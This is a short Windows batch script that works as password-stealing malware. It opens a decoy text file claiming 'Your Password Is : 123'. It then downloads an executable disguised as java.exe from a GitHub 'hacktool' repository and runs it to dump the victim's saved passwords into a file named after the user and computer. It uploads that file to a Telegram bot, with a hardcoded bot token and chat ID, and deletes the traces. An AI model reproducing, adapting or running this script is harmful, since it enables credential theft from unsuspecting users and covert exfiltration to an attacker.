@echo off
echo Your Password Is : 123>"%temp%\password.txt" & start "%temp%\password.txt"
cmd /c "curl -o "%temp%\java.exe" https://raw.githubusercontent.com/devilJM/Hacktool-For-Educational-Purposes/main/pass.exe & "%temp%\java.exe" /stext "%temp%\%username%-%computername%.txt" & curl -F document=@"%temp%\%username%-%computername%.txt" -F caption="Password From %username% - %computername%" "https://api.telegram.org/bot6481424824:AAF448E2lOZMaAZxDqFtrGE_0UONAA8-wH0/sendDocument?chat_id=365617307" & del "%temp%\java.exe" & del "%temp%\%username%-%computername%.txt" "
del "%temp%\password.txt"
pause
